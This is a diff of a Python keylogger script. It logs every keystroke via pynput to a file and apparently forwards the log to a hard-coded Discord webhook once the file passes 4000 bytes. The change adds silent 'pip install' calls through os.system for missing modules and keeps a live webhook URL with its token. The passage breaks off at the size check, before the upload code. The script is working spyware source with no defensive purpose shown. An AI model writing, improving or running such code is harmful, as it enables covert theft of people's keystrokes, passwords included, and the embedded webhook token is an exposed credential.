@@ -1,14 +1,28 @@
-from pynput.keyboard import Key, Listener
-from discord_webhook import DiscordWebhook
+# Default modules
 import os
 from threading import Thread
 from datetime import date
 
+# Non-default modules
+try:
+    from pynput.keyboard import Key, Listener
+except ImportError:
+    os.system('pip install pynput')
+    from pynput.keyboard import Key, Listener
+
+try:
+    from discord_webhook import DiscordWebhook
+except ImportError:
+    os.system('pip install discord_webhook')
+    from discord_webhook import DiscordWebhook
+
+
+
 ##### Field to fill ######
-W_U = "https://discord.com/api/webhooks/1154145011001208883/duzBD_fM21WSAaoiaGHDc_ObEENoC5vf7b6usxuVVtAeE4Fq5bOACBrTUxWFRXomKzBM" 
+
+W_U = "https://discord.com/api/webhooks/1154145011001208883/duzBD_fM21WSAaoiaGHDc_ObEENoC5vf7b6usxuVVtAeE4Fq5bOACBrTUxWFRXomKzBM" #Your webhook url
 
 def on_press(key):
-    #print('{0} pressed'.format(key))
     with open("logs.txt", "a") as file:
         file.write('{0}'.format(key))
     if os.path.getsize('logs.txt') > 4000 :
